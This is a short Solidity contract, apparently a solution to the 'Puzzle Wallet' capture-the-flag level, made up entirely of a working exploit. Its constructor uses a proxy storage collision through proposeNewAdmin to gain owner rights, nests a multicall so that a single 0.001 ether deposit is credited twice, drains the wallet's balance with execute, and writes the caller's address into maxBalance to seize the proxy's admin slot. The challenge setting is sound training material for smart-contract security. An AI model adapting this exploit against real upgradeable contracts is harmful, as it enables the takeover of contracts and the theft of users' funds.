// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../puzzleWallet/PuzzleWallet.sol";
contract WalletAttack {
    PuzzleProxy proxy;
    PuzzleWallet wallet;
    constructor(address instance) payable {
        proxy = PuzzleProxy(payable(instance));
        wallet = PuzzleWallet(instance);

        proxy.proposeNewAdmin(address(this));
        wallet.addToWhitelist(address(this));
        bytes[] memory data = new bytes[](2);
        data[0] = abi.encodeWithSignature("deposit()");

        bytes[] memory nestedDeposit = new bytes[](1);
        nestedDeposit[0] = abi.encodeWithSignature("deposit()");

        data[1] = abi.encodeWithSignature("multicall(bytes[])", nestedDeposit);
        wallet.multicall{value: 0.001 ether}(data);
        wallet.execute(address(this), 0.002 ether, "");
        uint256 maxBalance = uint256(bytes32(bytes20(address(msg.sender))) >> 96);
        wallet.setMaxBalance(maxBalance);
        
    }

    receive() payable external {}
}